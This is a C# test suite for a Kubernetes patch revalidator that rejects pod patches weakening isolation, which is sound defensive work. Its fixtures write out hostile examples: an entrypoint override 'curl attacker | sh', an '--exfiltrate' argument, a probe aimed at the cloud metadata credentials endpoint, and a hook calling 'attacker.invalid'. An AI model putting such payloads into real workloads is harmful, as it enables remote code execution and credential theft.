using FluentAssertions;
using k8s.Models;
using Reeve.Workloads.Abstractions.Contracts;
using Reeve.Workloads.Abstractions.Contracts.Deployment;
using Reeve.Workloads.Abstractions.Domain.DesiredSpec;
using Reeve.Workloads.Providers.Kubernetes;

namespace Reeve.Workloads.Providers.Kubernetes.Tests;

public sealed class KubernetesPatchRevalidatorTests
{
    private static readonly KubernetesPatchRevalidator Revalidator = new();

    [Fact]
    public void TheRenderersOwnOutput_IsNotAViolation()
    {
        Violations(Rendered()).Should().BeEmpty();
    }

    private static WorkloadDesiredSpec UserNamespaceSpec() => Spec() with { UserNamespace = true };

    [Fact]
    public void HostUsersFalse_IsAccepted_WhenTheSpecAsksForAUserNamespace()
    {
        var spec = UserNamespaceSpec();
        var rendered = Rendered(spec);
        PodOf(rendered).HostUsers = false;

        Violations(rendered, spec).Should().BeEmpty();
    }

    [Theory]
    [InlineData(true)]
    [InlineData(null)]
    public void APatchThatPutsAUserNamespaceSpecBackOnTheHostUsers_IsAViolation(bool? hostUsers)
    {
        var spec = UserNamespaceSpec();
        var rendered = Rendered(spec);
        PodOf(rendered).HostUsers = hostUsers;

        Violations(rendered, spec).Should().ContainSingle().Which.Should().Contain("hostUsers");
    }

    [Theory]
    [InlineData("""[{"op":"remove","path":"/spec/template/spec/hostUsers"}]""")]
    [InlineData("""[{"op":"replace","path":"/spec/template/spec/hostUsers","value":true}]""")]
    [InlineData("""[{"op":"replace","path":"/spec/template/spec/hostUsers","value":null}]""")]
    public void Json_patch_cannot_remove_or_enable_host_users_on_a_user_namespace_deployment(string patch)
        => PatchAndValidate(UserNamespaceSpec(), patch).Should().ContainSingle().Which.Should().Contain("hostUsers");

    [Fact]
    public void Json_patch_cannot_remove_host_users_on_a_user_namespace_daemonset()
        => PatchAndValidate(UserNamespaceSpec() with { Kind = WorkloadKind.PerNode },
                """[{"op":"remove","path":"/spec/template/spec/hostUsers"}]""")
            .Should().ContainSingle().Which.Should().Contain("hostUsers");

    [Theory]
    [InlineData("""[{"op":"test","path":"/spec/template/spec/hostUsers","value":false}]""")]
    [InlineData("""[{"op":"replace","path":"/spec/template/spec/hostUsers","value":false}]""")]
    public void Json_patch_may_restate_host_users_false_with_the_switch(string patch)
        => PatchAndValidate(UserNamespaceSpec(), patch).Should().BeEmpty();

    [Fact]
    public void Json_patch_cannot_add_host_users_false_without_the_switch()
        => PatchAndValidate(Spec(),
                """[{"op":"add","path":"/spec/template/spec/hostUsers","value":false}]""")
            .Should().ContainSingle().Which.Should().Contain("hostUsers");

    [Theory]
    [InlineData("network", "hostNetwork")]
    [InlineData("pid", "hostPID")]
    [InlineData("ipc", "hostIPC")]
    public void AUserNamespaceCannotBeCombinedWithAHostNamespacePatch(string hostNamespace, string expectedField)
    {
        var spec = UserNamespaceSpec();
        var rendered = Rendered(spec);
        var pod = PodOf(rendered);
        switch (hostNamespace)
        {
            case "network": pod.HostNetwork = true; break;
            case "pid": pod.HostPID = true; break;
            case "ipc": pod.HostIPC = true; break;
        }

        var violations = Violations(rendered, spec);
        violations.Should().Contain(v => v.Contains("user namespace") && v.Contains("hostNetwork") && v.Contains("hostPID") && v.Contains("hostIPC"));
        violations.Should().Contain(v => v.Contains(expectedField));
    }

    [Fact]
    public void TheRenderersOutputForAPlatformPinnedWorkload_IsNotAViolation()
    {
        var spec = Spec() with { Platforms = ["linux/amd64"] };

        Violations(Rendered(spec), spec).Should().BeEmpty();
    }

    [Fact]
    public void SwappingTheImage_IsAViolation()
    {
        Violations(Mutate(c => c.Image = "evil/backdoor:latest"))
            .Should().ContainSingle().Which.Should().Contain("not the desired, digest-pinned image");
    }

    [Fact]
    public void OverridingTheEntrypoint_IsAViolation()
        => Violations(Mutate(c => c.Command = ["/bin/sh", "-c", "curl attacker | sh"]))
            .Should().ContainSingle().Which.Should().Contain("overrides the entrypoint");

    [Fact]
    public void OverridingTheArguments_IsAViolation()
        => Violations(Mutate(c => c.Args = ["--exfiltrate"]))
            .Should().ContainSingle().Which.Should().Contain("overrides the arguments");

    [Fact]
    public void BulkImportingAnotherWorkloadsSecretViaEnvFrom_IsAViolation()
    {
        Violations(Mutate(c => c.EnvFrom =
                [new V1EnvFromSource { SecretRef = new V1SecretEnvSource { Name = "other-workload-secret" } }]))
            .Should().ContainSingle().Which.Should().Contain("envFrom");
    }

    [Fact]
    public void ReadingAnEnvFromAnotherWorkloadsSecret_IsAViolation()
        => Violations(Mutate(c => c.Env!.Add(new V1EnvVar
            {
                Name = "STOLEN",
                ValueFrom = new V1EnvVarSource
                {
                    SecretKeyRef = new V1SecretKeySelector { Name = "other-secret", Key = "token" },
                },
            })))
            .Should().ContainSingle().Which.Should().Contain("not this workload's own secret");

    [Fact]
    public void RewritingAnEnvTheEngineOwns_IsAViolation()
    {
        Violations(Mutate(c => c.Env!.First(e => e.Name == "REEVE_SPEC_HASH").Value = "forged"))
            .Should().ContainSingle().Which.Should().Contain("redefines env 'REEVE_SPEC_HASH'");
    }

    [Fact]
    public void AnExecLifecycleHook_IsAViolation()
        => Violations(Mutate(c => c.Lifecycle = new V1Lifecycle
            {
                PostStart = new V1LifecycleHandler { Exec = new V1ExecAction { Command = ["/bin/sh"] } },
            }))
            .Should().ContainSingle().Which.Should().Contain("lifecycle hook of kind 'exec'");

    [Fact]
    public void AnExecProbe_IsAViolation()
        => Violations(Mutate(c => c.LivenessProbe = new V1Probe { Exec = new V1ExecAction { Command = ["/bin/sh"] } }))
            .Should().ContainSingle().Which.Should().Contain("liveness probe of kind 'exec'");

    [Fact]
    public void AnInitContainerRunningAnArbitraryImage_IsAViolation()
    {
        var rendered = Rendered();
        PodOf(rendered).InitContainers = [new V1Container { Name = "init", Image = "evil/tool:latest" }];

        Violations(rendered).Should().Contain(v => v.Contains("not the desired, digest-pinned image"));
    }

    [Theory]
    [InlineData("csi")]
    [InlineData("flexVolume")]
    [InlineData("nfs")]
    public void AVolumeSourceOutsideTheAllowList_IsAViolation(string kind)
    {
        var rendered = Rendered();
        var volume = new V1Volume { Name = "sneaky" };
        switch (kind)
        {
            case "csi": volume.Csi = new V1CSIVolumeSource { Driver = "anything" }; break;
            case "flexVolume": volume.FlexVolume = new V1FlexVolumeSource { Driver = "anything" }; break;
            case "nfs": volume.Nfs = new V1NFSVolumeSource { Server = "10.0.0.1", Path = "/export" }; break;
        }

        PodOf(rendered).Volumes = [volume];

        Violations(rendered).Should().Contain(v => v.Contains($"'{kind}' source"));
    }

    [Fact]
    public void MountingAnotherWorkloadsPersistentVolumeClaim_IsAViolation()
    {
        var rendered = Rendered();
        PodOf(rendered).Volumes =
        [
            new V1Volume
            {
                Name = "theirs",
                PersistentVolumeClaim = new V1PersistentVolumeClaimVolumeSource { ClaimName = "someone-elses-data" },
            },
        ];

        Violations(rendered).Should().Contain(v => v.Contains("not one this workload declared"));
    }

    [Fact]
    public void SelectingADifferentContainerRuntime_IsAViolation()
        => Violations(MutatePod(p => p.RuntimeClassName = "runc"))
            .Should().ContainSingle().Which.Should().Contain("runtimeClassName");

    [Fact]
    public void OptingOutOfTheHostUserNamespace_IsAViolation()
        => Violations(MutatePod(p => p.HostUsers = false))
            .Should().ContainSingle().Which.Should().Contain("hostUsers=false");

    [Fact]
    public void TolerationsThatWouldReachATaintedNode_AreAViolation()
        => Violations(MutatePod(p => p.Tolerations = [new V1Toleration { OperatorProperty = "Exists" }]))
            .Should().ContainSingle().Which.Should().Contain("tolerations");

    [Fact]
    public void AnUndeclaredNodeSelector_IsAViolation()
        => Violations(MutatePod(p => p.NodeSelector = new Dictionary<string, string> { ["node-role"] = "control-plane" }))
            .Should().ContainSingle().Which.Should().Contain("nodeSelector");

    [Fact]
    public void UnconfiningSeccompAtPodLevel_IsAViolation()
        => Violations(MutatePod(p => p.SecurityContext = new V1PodSecurityContext
            {
                SeccompProfile = new V1SeccompProfile { Type = "Unconfined" },
            }))
            .Should().ContainSingle().Which.Should().Contain("Unconfined");

    [Fact]
    public void PinningThePodToANodeByName_IsAViolation()
    {
        Violations(MutatePod(p => p.NodeName = "control-plane-0"))
            .Should().ContainSingle().Which.Should().Contain("bypasses the scheduler");
    }

    [Fact]
    public void AddingADnsConfig_IsAViolation()
    {
        Violations(MutatePod(p => p.DnsConfig = new V1PodDNSConfig { Nameservers = ["10.0.0.66"] }))
            .Should().ContainSingle().Which.Should().Contain("dnsConfig");
    }

    [Fact]
    public void DroppingAppArmorConfinementOnAContainer_IsAViolation()
        => Violations(Mutate(c => c.SecurityContext!.AppArmorProfile = new V1AppArmorProfile { Type = "Unconfined" }))
            .Should().ContainSingle().Which.Should().Contain("AppArmor");

    [Fact]
    public void DroppingAppArmorConfinementThroughTheLegacyAnnotation_IsAViolation()
    {
        var rendered = Rendered();
        rendered.Deployment!.Spec.Template.Metadata.Annotations["container.apparmor.security.beta.kubernetes.io/app"]
            = "unconfined";

        Violations(rendered).Should().ContainSingle().Which.Should().Contain("legacy AppArmor surface");
    }

    [Fact]
    public void SettingSeLinuxOptions_IsAViolation()
        => Violations(Mutate(c => c.SecurityContext!.SeLinuxOptions = new V1SELinuxOptions { Type = "spc_t" }))
            .Should().ContainSingle().Which.Should().Contain("seLinuxOptions");

    [Fact]
    public void UnmaskingProc_IsAViolation()
        => Violations(Mutate(c => c.SecurityContext!.ProcMount = "Unmasked"))
            .Should().ContainSingle().Which.Should().Contain("procMount");

    [Fact]
    public void RunningAsTheRootGroup_IsAViolation()
        => Violations(Mutate(c => c.SecurityContext!.RunAsGroup = 0))
            .Should().ContainSingle().Which.Should().Contain("runAsGroup=0");

    [Fact]
    public void SettingAnUndeclaredFsGroup_IsAViolation()
    {
        Violations(MutatePod(p => p.SecurityContext = new V1PodSecurityContext { FsGroup = 0 }))
            .Should().Contain(v => v.Contains("fsGroup"));
    }

    [Fact]
    public void RestatingTheDeclaredVolumeGroup_IsNotAViolationButAnotherGroupIs()
    {
        var spec = Spec() with { Privileges = new ResolvedPrivileges { FsGroup = 1000 } };
        var rendered = Rendered(spec);

        rendered.Deployment!.Spec.Template.Spec.SecurityContext!.FsGroup = 1000;
        Violations(rendered, spec).Should().BeEmpty();

        rendered.Deployment.Spec.Template.Spec.SecurityContext!.FsGroup = 999;
        Violations(rendered, spec).Should().Contain(v => v.Contains("fsGroup=999"));
    }

    [Fact]
    public void ReadingAnEnvFromAnUndeclaredConfigMap_IsAViolation()
    {
        Violations(Mutate(c => c.Env!.Add(new V1EnvVar
            {
                Name = "STOLEN",
                ValueFrom = new V1EnvVarSource
                {
                    ConfigMapKeyRef = new V1ConfigMapKeySelector { Name = "other-config", Key = "k" },
                },
            })))
            .Should().ContainSingle().Which.Should().Contain("not one this workload declares");
    }

    [Fact]
    public void RenamingTheDeploymentOntoASibling_IsAViolation()
    {
        var rendered = Rendered();
        rendered.Deployment!.Metadata.Name = "reeve-zigbee2mqtt-main-3f2a91bc";

        Violations(rendered).Should().ContainSingle()
            .Which.Should().Contain("would land on a DIFFERENT object");
    }

    [Fact]
    public void RelabellingTheObject_IsAViolation()
    {
        var rendered = Rendered();
        rendered.Deployment!.Metadata.Labels["reeve-iot.dev/workload-instance"] = "someone-elses-instance";

        Violations(rendered).Should().ContainSingle().Which.Should().Contain("metadata.labels");
    }

    [Fact]
    public void RepointingTheSelectorAtAnotherWorkloadsPods_IsAViolation()
    {
        var rendered = Rendered();
        rendered.Deployment!.Spec.Selector.MatchLabels["reeve-iot.dev/workload-instance"] = "someone-elses-instance";

        Violations(rendered).Should().ContainSingle()
            .Which.Should().Contain("adopt pods this workload does not own");
    }

    [Fact]
    public void AMatchExpressionOnTheSelector_IsAViolation()
    {
        var rendered = Rendered();
        rendered.Deployment!.Spec.Selector.MatchExpressions =
            [new V1LabelSelectorRequirement { Key = "reeve-iot.dev/workload-instance", OperatorProperty = "Exists" }];

        Violations(rendered).Should().ContainSingle().Which.Should().Contain("matchExpressions");
    }

    [Fact]
    public void AnHttpGetProbe_IsAViolation()
    {
        Violations(Mutate(c => c.LivenessProbe = new V1Probe
            {
                HttpGet = new V1HTTPGetAction
                {
                    Host = "169.254.169.254",
                    Path = "/latest/meta-data/iam/security-credentials/",
                    Port = 80,
                },
            }))
            .Should().ContainSingle().Which.Should().Contain("liveness probe of kind 'httpGet'");
    }

    [Fact]
    public void ATcpSocketReadinessProbe_IsAViolation()
        => Violations(Mutate(c => c.ReadinessProbe = new V1Probe
            {
                TcpSocket = new V1TCPSocketAction { Host = "10.0.0.1", Port = 6443 },
            }))
            .Should().ContainSingle().Which.Should().Contain("readiness probe of kind 'tcpSocket'");

    [Fact]
    public void AnHttpGetPreStopHook_IsAViolation()
        => Violations(Mutate(c => c.Lifecycle = new V1Lifecycle
            {
                PreStop = new V1LifecycleHandler { HttpGet = new V1HTTPGetAction { Host = "attacker.invalid", Port = 80 } },
            }))
            .Should().ContainSingle().Which.Should().Contain("lifecycle hook of kind 'httpGet'");

    [Fact]
    public void FlippingAConsentedReadOnlyConfigMapMountToWritable_IsAViolation()
    {
        var spec = SpecWithConfigMapMount();
        var rendered = Rendered(spec);
        var mount = PodOf(rendered).Containers[0].VolumeMounts.Single(m => m.MountPath == "/etc/app");
        mount.ReadOnlyProperty = false;

        Violations(rendered, spec).Should().ContainSingle().Which.Should().Contain("WRITABLE");
    }

    [Fact]
    public void FlippingAReadOnlyHostPathMountToWritable_IsAViolation()
    {
        var spec = SpecWithHostPath();
        var rendered = Rendered(spec);
        var mount = PodOf(rendered).Containers[0].VolumeMounts.Single(m => m.MountPath == "/host/etc");
        mount.ReadOnlyProperty = null;

        Violations(rendered, spec).Should().ContainSingle().Which.Should().Contain("resolved read-only");
    }

    [Theory]
    [InlineData("v1.multus-cni.io/default-network", "other-namespace/attacker-net")]
    [InlineData("sidecar.istio.io/inject", "true")]
    [InlineData("vault.hashicorp.com/agent-inject", "true")]
    public void APrefixedPodAnnotation_IsAViolation(string key, string value)
        => PatchAndValidate(Spec(),
                $$"""[{"op":"add","path":"/spec/template/metadata/annotations/{{key.Replace("/", "~1", StringComparison.Ordinal)}}","value":"{{value}}"}]""")
            .Should().ContainSingle().Which.Should().Contain($"pod annotation '{key}'");

    [Fact]
    public void AnUnprefixedPodOrObjectAnnotation_IsNotAViolation()
        => PatchAndValidate(Spec(),
                """[{"op":"add","path":"/spec/template/metadata/annotations/team","value":"iot"},{"op":"add","path":"/metadata/annotations","value":{"owner":"ops"}}]""")
            .Should().BeEmpty();

    [Fact]
    public void APrefixedWorkloadObjectAnnotation_IsAViolation()
        => PatchAndValidate(Spec(),
                """[{"op":"add","path":"/metadata/annotations","value":{"argocd.argoproj.io/sync-options":"Prune=false"}}]""")
            .Should().ContainSingle().Which.Should().Contain("deployment annotation 'argocd.argoproj.io/sync-options'");

    [Theory]
    [InlineData("/metadata/finalizers", "metadata.finalizers")]
    [InlineData("/spec/template/metadata/finalizers", "spec.template.metadata.finalizers")]
    public void AFinalizer_IsAViolation(string path, string where)
        => PatchAndValidate(Spec(), $$"""[{"op":"add","path":"{{path}}","value":["example.com/hold"]}]""")
            .Should().ContainSingle().Which.Should().Contain(where);

    [Fact]
    public void AnOwnerReference_IsAViolation()
        => PatchAndValidate(Spec(),
                """[{"op":"add","path":"/metadata/ownerReferences","value":[{"apiVersion":"v1","kind":"ConfigMap","name":"anchor","uid":"5f0c2a4e-0000-0000-0000-000000000001"}]}]""")
            .Should().ContainSingle().Which.Should().Contain("ownerReferences [ConfigMap/anchor]");

    [Fact]
    public void APodResourceClaim_IsAViolation()
        => PatchAndValidate(Spec(),
                """[{"op":"add","path":"/spec/template/spec/resourceClaims","value":[{"name":"gpu","resourceClaimName":"shared-gpu"}]}]""")
            .Should().ContainSingle().Which.Should().Contain("pod resourceClaims [gpu]");

    [Fact]
    public void AContainerResourceClaim_IsAViolation()
        => PatchAndValidate(Spec(),
                """[{"op":"add","path":"/spec/template/spec/containers/0/resources","value":{"claims":[{"name":"gpu"}]}}]""")
            .Should().ContainSingle().Which.Should().Contain("resource claims [gpu]");

    [Fact]
    public void TheRenderersOwnEscapedEnvValue_IsNotAViolation()
    {
        var spec = Spec() with
        {
            Env = [new ResolvedEnvVar { Name = "PASSWORD", Kind = ResolvedEnvKind.Literal, Value = "pa$$w$(ord)" }],
        };

        Violations(Rendered(spec), spec).Should().BeEmpty();
    }

    [Fact]
    public void AnUnescapedEnvValue_IsAViolation()
    {
        var spec = Spec() with
        {
            Env = [new ResolvedEnvVar { Name = "PASSWORD", Kind = ResolvedEnvKind.Literal, Value = "pa$$word" }],
        };
        var rendered = Rendered(spec);
        PodOf(rendered).Containers[0].Env.Single(e => e.Name == "PASSWORD").Value = "pa$$word";

        Violations(rendered, spec).Should().ContainSingle().Which.Should().Contain("PASSWORD");
    }

    [Fact]
    public void TheRenderersOwnOutputForEveryHostPathSource_IsNotAViolation()
    {
        var spec = Spec() with
        {
            Privileges = new ResolvedPrivileges
            {
                NodeLocalState = new ResolvedNodeLocalState { HostPath = "/var/lib/reeve/x/state", Criticality = VolumeCriticality.Critical },
                DbusHostPath = "/run/dbus",
                TunDevice = true,
                DevicePaths = ["/dev/ttyUSB0"],
                HostPaths = [new ResolvedHostPath { HostPath = "/sys/bus/usb", MountPath = "/host/usb" }],
            },
        };

        Violations(Rendered(spec), spec).Should().BeEmpty();
    }

    [Theory]
    [InlineData("DirectoryOrCreate")]
    [InlineData("CharDevice")]
    public void RetypingAReadOnlyHostPathToAWritableKind_DoesNotLetItsMountBeWritable(string patchedType)
    {
        var spec = SpecWithHostPath();
        var rendered = Rendered(spec);
        var pod = PodOf(rendered);
        var mount = pod.Containers[0].VolumeMounts.Single(m => m.MountPath == "/host/etc");
        pod.Volumes.Single(v => v.Name == mount.Name).HostPath.Type = patchedType;
        mount.ReadOnlyProperty = null;

        var violations = Violations(rendered, spec);

        violations.Should().HaveCount(2);
        violations.Should().Contain(v => v.Contains("resolved read-only"));
        violations.Should().Contain(v => v.Contains($"hostPath type '{patchedType}'"));
    }

    [Fact]
    public void RetypingAHostPathVolume_IsAViolation()
    {
        var spec = SpecWithHostPath();
        var rendered = Rendered(spec);
        var pod = PodOf(rendered);
        var mount = pod.Containers[0].VolumeMounts.Single(m => m.MountPath == "/host/etc");
        pod.Volumes.Single(v => v.Name == mount.Name).HostPath.Type = "DirectoryOrCreate";

        Violations(rendered, spec).Should().ContainSingle().Which.Should().Contain("hostPath type 'DirectoryOrCreate'");
    }

    [Fact]
    public void ASubPathOnAConsentedMount_IsAViolation()
    {
        var spec = SpecWithHostPath();
        var rendered = Rendered(spec);
        PodOf(rendered).Containers[0].VolumeMounts.Single(m => m.MountPath == "/host/etc").SubPath = "shadow";

        Violations(rendered, spec).Should().ContainSingle().Which.Should().Contain("subPath");
    }

    [Fact]
    public void BidirectionalMountPropagation_IsAViolation()
    {
        var spec = SpecWithHostPath();
        var rendered = Rendered(spec);
        PodOf(rendered).Containers[0].VolumeMounts
            .Single(m => m.MountPath == "/host/etc").MountPropagation = "Bidirectional";

        Violations(rendered, spec).Should().ContainSingle().Which.Should().Contain("mountPropagation");
    }

    [Fact]
    public void MountingAVolumeThePodNeverDeclares_IsAViolation()
    {
        Violations(Mutate(c => c.VolumeMounts =
                [new V1VolumeMount { Name = "ghost", MountPath = "/mnt/ghost" }]))
            .Should().ContainSingle().Which.Should().Contain("no volume by that name");
    }

    [Fact]
    public void MountingAnotherWorkloadsConfigMap_IsAViolation()
    {
        Violations(MutatePod(p => p.Volumes =
            [
                new V1Volume
                {
                    Name = "stolen",
                    ConfigMap = new V1ConfigMapVolumeSource { Name = "reeve-other-workload-config" },
                },
            ]))
            .Should().ContainSingle().Which.Should().Contain("which this workload never declared");
    }

    [Fact]
    public void AProjectedPodCertificateSource_IsAViolation()
    {
        Violations(MutatePod(p => p.Volumes =
            [
                new V1Volume
                {
                    Name = "ident",
                    Projected = new V1ProjectedVolumeSource
                    {
                        Sources =
                        [
                            new V1VolumeProjection
                            {
                                PodCertificate = new V1PodCertificateProjection
                                {
                                    SignerName = "kubernetes.io/kube-apiserver-client",
                                    KeyType = "ECDSAP256",
                                    CredentialBundlePath = "creds",
                                },
                            },
                        ],
                    },
                },
            ]))
            .Should().ContainSingle().Which.Should().Contain("podCertificate");
    }

    [Fact]
    public void AnExtendedResourceRequest_IsAViolation()
    {
        Violations(Mutate(c => c.Resources = new V1ResourceRequirements
            {
                Limits = new Dictionary<string, ResourceQuantity> { ["smarter-devices/ttyUSB0"] = new("1") },
            }))
            .Should().ContainSingle().Which.Should().Contain("smarter-devices/ttyUSB0");
    }

    [Fact]
    public void TheRenderersOwnCpuAndMemoryLimits_AreNotAViolation()
        => Violations(Mutate(c => c.Resources = new V1ResourceRequirements
            {
                Limits = new Dictionary<string, ResourceQuantity> { ["cpu"] = new("500m"), ["memory"] = new("256Mi") },
                Requests = new Dictionary<string, ResourceQuantity> { ["cpu"] = new("100m") },
            }))
            .Should().BeEmpty();

    private static IReadOnlyList<string> Violations(RenderedKubernetesObjects rendered, WorkloadDesiredSpec? spec = null)
        => Revalidator.Validate(spec ?? Spec(), rendered);

    private static IReadOnlyList<string> PatchAndValidate(WorkloadDesiredSpec spec, string patch)
        => Revalidator.Validate(spec, new UnsupportedPodPatchApplier().Apply(Rendered(spec), patch));

    private static WorkloadDesiredSpec SpecWithConfigMapMount() => Spec() with
    {
        ConfigMapMounts = [new ResolvedConfigMapMount { MountPath = "/etc/app", ConfigMapName = "res-config" }],
    };

    private static WorkloadDesiredSpec SpecWithHostPath() => Spec() with
    {
        Privileges = new ResolvedPrivileges
        {
            HostPaths = [new ResolvedHostPath { HostPath = "/etc", MountPath = "/host/etc" }],
        },
    };

    private static RenderedKubernetesObjects Mutate(Action<V1Container> mutate)
    {
        var rendered = Rendered();
        mutate(PodOf(rendered).Containers[0]);
        return rendered;
    }

    private static RenderedKubernetesObjects MutatePod(Action<V1PodSpec> mutate)
    {
        var rendered = Rendered();
        mutate(PodOf(rendered));
        return rendered;
    }

    private static V1PodSpec PodOf(RenderedKubernetesObjects rendered)
        => rendered.Deployment?.Spec?.Template?.Spec ?? rendered.DaemonSet!.Spec.Template.Spec;

    private static RenderedKubernetesObjects Rendered(WorkloadDesiredSpec? spec = null)
        => new KubernetesWorkloadRenderer().Render(
            spec ?? Spec(), new KubernetesRenderContext { Namespace = "reeve" });

    private static WorkloadDesiredSpec Spec() => new()
    {
        GroupInstanceId = Guid.Parse("11111111-1111-1111-1111-111111111111"),
        GroupId = "mod",
        WorkloadId = "w",
        InstanceId = Guid.Parse("22222222-2222-2222-2222-222222222222"),
        Inst8 = "abcd1234",
        Provider = KubernetesProvider.Id,
        ResourceName = "res",
        SecretName = "res-secret",
        Labels = new Dictionary<string, string>(),
        Image = "reg/img@sha256:" + new string('a', 64),
        Kind = WorkloadKind.Service,
        Health = new WorkloadHealth { Mode = WorkloadHealthMode.Container },
        SpecHash = "the-hash",
        Env =
        [
            new ResolvedEnvVar { Name = "REEVE_SPEC_HASH", Kind = ResolvedEnvKind.SpecHash, Value = "the-hash" },
            new ResolvedEnvVar { Name = "GATEWAY_URL", Kind = ResolvedEnvKind.Literal, Value = "wss://reeve/ws" },
        ],
    };
}
